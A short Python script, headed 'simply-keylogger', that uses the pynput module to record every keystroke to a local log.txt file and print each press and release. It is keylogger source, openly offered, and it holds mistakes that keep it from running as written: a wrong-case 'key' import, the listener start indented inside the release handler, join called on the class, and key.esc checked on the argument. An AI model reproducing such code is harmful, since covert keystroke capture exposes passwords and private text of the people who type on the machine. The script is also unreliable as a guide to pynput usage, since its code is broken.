# simply-keylogger
# keylogger using pynput module
import pynput
from pynput.keyboard import key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
            # every keystroke for readability
            f.write(' ')



def on_release(key):
    print('{0} released'.format(key))
    if key == key.esc:
        # stop Listener
        return False
    
    with Listener(on_press=on_press,
                   on_release=on_release) as listener:
        Listener.join()
